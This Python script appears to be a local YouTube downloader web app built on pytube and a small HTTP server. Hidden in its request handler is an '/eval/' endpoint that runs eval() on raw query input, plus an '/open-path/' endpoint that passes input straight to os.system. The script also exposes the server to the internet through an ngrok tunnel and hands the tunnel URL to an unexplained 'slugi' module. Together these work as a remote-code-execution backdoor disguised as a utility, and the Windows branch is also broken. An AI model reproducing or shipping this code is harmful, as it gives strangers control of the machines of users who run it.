import os, webbrowser, sys, socketserver, socket, pytube, unicodedata, re, urllib, http.server, platform, slugi, pystray
from threading import Thread
from time import sleep
from pyngrok.ngrok import connect as cn
from PIL import Image

iconfile = Image.open("icon.png")

if(len(sys.argv) > 1):
    try:
        port = int(sys.argv[1])
    except:
        port = 4658
else:
    port = 4658

slugi.init(cn(port))

os.chdir('web')

if(platform.system() == "Windows"):
        os.system("explorer.exe " + path)
elif(platform.system() == "Linux"):
    def openPath(path):
        os.system("xdg-open " + path)
elif(platform.system() == "Darwin"):
    def openPath(path):
        os.system("open " + path)

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        req = self.requestline.split(" ")[1]
        print(self.path)
        try:
            nparams = req.split('?')[1].split('&')
        except:
            try:
                nparams = [req.split('?')[1]]
            except:
                nparams = []
        params = []
        for item in nparams:
            params.append(urllib.parse.unquote(item))
        if(req.find("/convert/get") != -1):
            url, res = params[0], params[1]
            convert(url,res)
            return super().do_GET()
        if(req.find("/eval/") != -1):
            eval(params[0])
            return super().do_GET()
        if(req.find("/open-path/") != -1):
            openPath(params[0])
            return super().do_GET()
        return super().do_GET()

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    pass

def convert(url,resolution):
    yt = pytube.YouTube(url)
    stream = yt.streams.get_by_resolution(resolution) # example: 720p, 480p
    if(stream == None):
        stream = yt.streams.get_highest_resolution()
    fileName = slugi.slugify(yt.title)
    if(os.path.exists("downloads/" + fileName)):
        return "File already exists!"
    stream.download("downloads",filename=fileName)
    return "File downloaded!"

if __name__ == '__main__':
    try:
        server = ThreadedHTTPServer(('localhost', port), Handler)
        print('Starting server, use <Ctrl-C> to stop')
        webbrowser.open("localhost:" + str(port))
        server.serve_forever()
    except:
        webbrowser.open("localhost:" + str(port))